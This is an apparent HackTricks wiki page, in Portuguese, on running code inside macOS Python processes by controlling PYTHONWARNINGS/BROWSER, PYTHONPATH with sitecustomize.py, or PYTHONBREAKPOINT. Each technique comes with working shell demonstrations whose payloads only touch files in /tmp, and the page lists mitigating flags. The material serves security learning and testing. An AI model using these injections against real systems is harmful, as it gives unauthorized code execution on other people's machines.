# Injeção em aplicações Python do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Por meio das variáveis de ambiente `PYTHONWARNINGS` e `BROWSER`

Se um invasor puder controlar o ambiente de um processo Python, a combinação de `PYTHONWARNINGS` e `BROWSER` poderá acionar a execução de comandos quando o Python importar o módulo `antigravity` ao processar uma opção de warning criada para esse fim. A técnica depende de `antigravity` abrir uma URL com o módulo `webbrowser` do Python, que respeita a variável de ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Via `PYTHONPATH` e `sitecustomize.py`

Durante a inicialização normal, o módulo `site` do Python adiciona caminhos específicos do site e, em seguida, tenta importar um módulo chamado `sitecustomize`. Ao colocar um diretório legível pelo attacker primeiro em `PYTHONPATH`, um attacker que controla o ambiente do processo pode fazer com que o Python importe um payload antes do script alvo. A flag `-S` desativa a inicialização automática de `site`, enquanto o modo isolado (`-I`) ignora `PYTHONPATH` e implica `-s` e `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Via `PYTHONBREAKPOINT`

Desde o Python 3.7 (PEP 553), o `breakpoint()` integrado importa e chama tudo para o que `sys.breakpointhook` aponta, e esse destino é obtido da variável de ambiente **`PYTHONBREAKPOINT`** (`package.module.callable`). Tanto a importação do módulo nomeado quanto a chamada do callable são executadas antes que o debugger normalmente apareça; portanto, um atacante que controle o ambiente de um processo que alcance um `breakpoint()` (algo comum em scripts de manutenção/debug e que às vezes permanece em caminhos de produção) obtém execução de código.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Ao contrário de `PYTHONWARNINGS`/`PYTHONPATH`, isso exige que o alvo realmente alcance uma chamada a `breakpoint()`, mas também funciona exclusivamente por meio dos **efeitos colaterais de import** do módulo nomeado (aponte-o para qualquer módulo importável — por exemplo, um colocado primeiro no `PYTHONPATH` — cujo nível superior execute código). Definir `PYTHONBREAKPOINT=0` desativa o hook completamente.

## References

- [1] [Hacking com variáveis de ambiente - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuração específico do site](https://docs.python.org/3/library/site.html)
- [3] [Linha de comando e ambiente do Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() integrado e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
